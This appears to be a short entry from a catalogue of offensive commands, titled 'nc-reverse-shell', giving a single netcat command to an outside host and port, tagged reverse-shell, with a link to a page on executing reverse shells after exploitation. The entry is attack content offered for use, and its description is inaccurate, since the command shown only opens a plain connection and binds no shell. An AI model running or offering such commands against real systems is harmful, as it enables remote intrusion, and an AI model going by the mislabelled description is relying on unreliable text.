---
id: 0c214805-c2ee-42e8-8b56-8c3b145a106c
name: nc-reverse-shell
type: command
executor: bash
data: nc aw.rs 12345
output: null
created_at: '2025-12-09T00:20:45.045Z'
updated_at: '2025-12-09T00:20:45.045Z'
platforms:
  - Linux
tags:
  - netcat
  - reverse-shell
verified: false
validated: true
submitted: true
---

# nc-reverse-shell

## Command

```bash
nc aw.rs 12345
```

## Description

Establishes a reverse shell connection using netcat.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `aw.rs` | Host | Yes |
| `12345` | Port | Yes |

## Examples

### Basic Usage

```bash
nc aw.rs 12345
```

## Expected Output

Establishes connection.

## Related

- #nc
- [[Verify Exploitation and Execute Reverse Shell]]
